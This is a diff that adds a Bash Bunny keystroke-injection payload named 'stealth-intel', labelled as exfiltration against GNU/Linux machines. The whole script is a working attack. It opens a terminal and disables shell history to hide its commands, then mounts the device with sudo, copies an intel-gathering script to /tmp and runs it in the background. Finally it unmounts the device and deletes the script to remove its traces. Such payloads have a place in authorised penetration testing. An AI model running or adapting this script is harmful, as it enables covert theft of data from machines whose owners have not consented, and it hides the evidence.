@@ -1,0 +1,61 @@
+# Title: stealth-intel
+# Description: Collect detailed information from a target machine and exfiltrate it via the Bash Bunny
+# AUTHOR: drapl0n
+# Version: 1.1
+# Category: Exfiltration
+# Target: GNU/Linux operating systems.
+# Attackmodes: HID, Storage.
+
+# Set LED to show the Bash Bunny is setting up
+LED SETUP
+
+# Determine the position of the switch
+GET SWITCH_POSITION
+
+# Set LED to show the attack is in progress
+LED ATTACK
+
+# Open a new terminal window
+Q GUI r
+Q DELAY 500
+Q STRING gnome-terminal
+Q ENTER
+Q DELAY 500
+
+# Prevent storing command history
+Q STRING unset HISTFILE
+Q ENTER
+Q DELAY 500
+
+# Mount Bash Bunny storage as a temporary directory
+Q STRING mount | grep /mnt/udisk || mkdir /tmp/bb && sudo mount /dev/sda1 /tmp/bb/
+Q ENTER
+Q DELAY 500
+
+# Copy the intel script from Bash Bunny storage to the target machine
+Q STRING cp /tmp/bb/payloads/library/intel.sh /tmp/
+Q ENTER
+Q DELAY 500
+
+# Make the script executable
+Q STRING chmod +x /tmp/intel.sh
+Q ENTER
+Q DELAY 500
+
+# Run the intel script
+Q STRING /tmp/./intel.sh &
+Q ENTER
+Q DELAY 500
+
+# Unmount Bash Bunny storage
+Q STRING sudo umount /tmp/bb/
+Q ENTER
+Q DELAY 500
+
+# Remove the intel script from the target machine
+Q STRING rm /tmp/intel.sh
+Q ENTER
+Q DELAY 500
+
+# Set LED to show the attack is finished
+LED FINISH
